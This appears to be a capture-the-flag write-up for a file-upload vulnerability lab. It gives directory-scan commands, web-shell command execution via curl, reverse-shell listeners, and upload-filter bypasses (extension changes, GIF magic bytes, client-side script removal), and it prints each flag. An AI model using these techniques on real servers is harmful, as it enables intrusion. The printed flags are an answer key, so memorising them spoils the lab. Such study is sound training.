add : `10.10.138.214    overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic.uploadvulns.thm jewel.uploadvulns.thm demo.uploadvulns.thm`

to file `hosts` in `/etc`

navitigate -> overwrite.uploadvuls.thm -> overwrite image -> `THM{OTBiODQ3YmNjYWZhM2UyMmYzZDNiZjI5}` 

scanning the dir : gobuster dir -u http://shell.uploadvulns.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

edit  webshell.php -> upload to server -> execute some command (RCE)

curl "http://shell.uploadvulns.thm/resources/webshell.php?cmd=cat%20/var/www/flag.txt" -> `THM{YWFhY2U3ZGI4N2QxNmQzZjk0YjgzZDZk}`

`Bypass Client-Side Filltering` :

gobuster dir -u http://java.uploadvulns.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -> `/images`

Burpsuite -> look at javascript : `client-side-filter.js` -> modify to upload a file `.php` or another reverse shell->  catch the request -> send reverse shell 

setup listener : `nc -lvnp 1234` -> read file flag.txt -> `THM{NDllZDQxNjJjOTE0YWNhZGY3YjljNmE2}`

`Bypass Server-Side Filltering : File Extension` :

scanning : gobuster dir -u http://annex.uploadvulns.thm/  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

try upload file type : .jpg , .php, .jpg.php -> just .jpg is success

upload a reverse shell -> most block .php and .phtml -> modify the file reverse-shell -> .php5 or another -> upload to server.

listener : `nc -lvnp 1234 ` -> `THM{MGEyYzJiYmI3ODIyM2FlNTNkNjZjYjFl}`

`Bypass Server-Side Filltering : Magic Number` :
scanning : ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://magic.uploadvulns.thm/FUZZ -> `graphics` directory

the web allow GIFs file only -> add `GIF8` to the top of the reverse shell -> make this file to GIF type 
upload to the server -> make a listener : `nc -lvnp 1234` ( after open file on the web) -> `THM{MWY5ZGU4NzE0ZDlhNjE1NGM4ZThjZDJh}`

`Last challenge`

scanning the dir : gobuster dir -u http://jewel.uploadvulns.thm/  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t50
 -> : 
/content              (Status: 301) [Size: 181] [--> /content/]
/modules              (Status: 301) [Size: 181] [--> /modules/]
/admin                (Status: 200) [Size: 1238]
/assets               (Status: 301) [Size: 179] [--> /assets/]
/Content              (Status: 301) [Size: 181] [--> /Content/]

using `Wappalyzer` -> identify the web is using `Node.js` languege --> download Node.js reverse shell

trying upload some file on the web -> accept file type `.jpg` -> modify the `shell.js` to `shell.jpg` :

Using Burp-Suite to remove the Client-Side Filter -> upload the `shell.jpg` ( need remove `^js$` to catch the javescripts)

scan the upload (.jpg) : gobuster dir -u http://jewel.uploadvulns.thm/content  -w /home/kali/Downloads/tryhackme/Upload_Vulnerabilities/UploadVulnWordlist.txt -x jpg -t64
->
/ABH.jpg              (Status: 200) [Size: 705442]
/JJB.jpg              (Status: 200) [Size: 83279]
/KYL.jpg              (Status: 200) [Size: 383]
/LKQ.jpg              (Status: 200) [Size: 444808]
/SAD.jpg              (Status: 200) [Size: 247159]
/UAD.jpg              (Status: 200) [Size: 342033]

take a look all of them -> the `/KYL.jpg` is the the shell which uploaded to the server ( can `change` the name each time scanning ) 

move to the `/admin` and run that -> (setup the netcat listener first : `nc -lvnp 1234`) 

waiting on the listener channel setup -> `THM{NzRlYTUwNTIzODMwMWZhMzBiY2JlZWU2}`